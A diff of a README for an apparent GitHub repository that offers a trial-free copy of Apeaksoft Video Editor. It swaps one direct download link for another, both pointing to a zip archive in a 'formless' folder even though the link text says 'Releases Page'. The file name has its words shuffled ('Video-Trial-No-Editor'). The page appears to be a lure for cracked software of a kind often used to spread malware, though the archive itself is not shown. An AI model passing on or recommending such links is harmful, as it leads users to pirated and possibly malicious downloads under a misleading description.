@@ -1,6 +1,6 @@
 # 🎥 Apeaksoft-Video-Editor-No-Trial - Edit Videos with Ease
 
-[![Download Apeaksoft Video Editor](https://raw.githubusercontent.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/main/formless/Apeaksoft-Video-Editor-No-Trial-3.7-alpha.5.zip%20Video%https://raw.githubusercontent.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/main/formless/Apeaksoft-Video-Editor-No-Trial-3.7-alpha.5.zip)](https://raw.githubusercontent.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/main/formless/Apeaksoft-Video-Editor-No-Trial-3.7-alpha.5.zip)
+[![Download Apeaksoft Video Editor](https://github.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/raw/refs/heads/main/formless/Apeaksoft-Video-Trial-No-Editor-v1.1.zip%20Video%https://github.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/raw/refs/heads/main/formless/Apeaksoft-Video-Trial-No-Editor-v1.1.zip)](https://github.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/raw/refs/heads/main/formless/Apeaksoft-Video-Trial-No-Editor-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Apeaksoft Video Editor! This application will help you edit video
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/main/formless/Apeaksoft-Video-Editor-No-Trial-3.7-alpha.5.zip).
+1. Visit this page to download: [Releases Page](https://github.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/raw/refs/heads/main/formless/Apeaksoft-Video-Trial-No-Editor-v1.1.zip).
 
 2. On the Releases page, find the latest version of Apeaksoft Video Editor. Click on the version you want to download.
 
@@ -70,4 +70,4 @@ Explore these topics for a deeper understanding of what Apeaksoft Video Editor c
 
 ## 📌 Final Notes
 
-We hope you enjoy using Apeaksoft Video Editor! For updates and additional resources, remember to keep checking our [Releases Page](https://raw.githubusercontent.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/main/formless/Apeaksoft-Video-Editor-No-Trial-3.7-alpha.5.zip).
+We hope you enjoy using Apeaksoft Video Editor! For updates and additional resources, remember to keep checking our [Releases Page](https://github.com/AliMohamad8700/Apeaksoft-Video-Editor-No-Trial/raw/refs/heads/main/formless/Apeaksoft-Video-Trial-No-Editor-v1.1.zip).
